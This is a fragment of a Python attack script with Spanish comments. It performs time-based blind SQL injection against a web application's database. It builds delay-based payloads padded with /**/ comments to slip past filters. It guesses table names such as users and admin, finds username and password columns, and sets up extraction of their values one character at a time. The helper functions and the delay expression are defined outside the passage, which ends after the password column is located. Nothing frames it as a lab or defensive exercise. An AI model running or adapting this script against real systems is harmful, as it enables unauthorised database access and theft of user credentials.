def extract_with_time(query, pos, char_type="ascii"):
    """Extrae datos usando la técnica del PDF"""
    # Primero probamos si la tabla existe
    if char_type == "exists":
        payload = f"EXISTS({query})/**/AND/**/{heavy}"
        t = test_time_based(payload)
        return t > 3
    
    # Para extraer caracteres
    print(f"  Probando posición {pos}...")
    for ascii_val in range(32, 127):  # Caracteres imprimibles
        if char_type == "ascii":
            cond = f"ASCII(SUBSTRING(({query}),{pos},1))={ascii_val}"
        else:
            cond = f"ASCII(SUBSTRING(({query}),{pos},1))>{ascii_val}"
        
        payload = f"IF({cond},{heavy},0)"
        t = test_time_based(payload)
        
        if t > 3:
            return chr(ascii_val)
    
    return None

# Encontrar la tabla
print("\n[2] Buscando tabla...")
tablas = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores', 'user']
tabla_encontrada = None

for tabla in tablas:
    query = f"SELECT/**/*/**/FROM/**/{tabla}"
    print(f"  Probando tabla: {tabla}")
    if extract_with_time(query, 0, "exists"):
        print(f"  ✅ ¡Tabla encontrada!: {tabla}")
        tabla_encontrada = tabla
        break

if not tabla_encontrada:
    print("  ❌ No se encontró ninguna tabla")
    exit()

# Encontrar columnas
print(f"\n[3] Buscando columnas en {tabla_encontrada}...")
columnas = ['username', 'user', 'login', 'name', 'admin', 'usuario']
columna_user = None

for col in columnas:
    query = f"SELECT/**/{col}/**/FROM/**/{tabla_encontrada}"
    print(f"  Probando columna: {col}")
    if extract_with_time(query, 0, "exists"):
        print(f"  ✅ ¡Columna encontrada!: {col}")
        columna_user = col
        break

# Buscar columna de contraseña
columnas_pass = ['password', 'pass', 'clave', 'contrasena', 'pwd', 'pw']
columna_pass = None

for col in columnas_pass:
    query = f"SELECT/**/{col}/**/FROM/**/{tabla_encontrada}"
    print(f"  Probando columna: {col}")
    if extract_with_time(query, 0, "exists"):
        print(f"  ✅ ¡Columna de contraseña encontrada!: {col}")
        columna_pass = col
        break
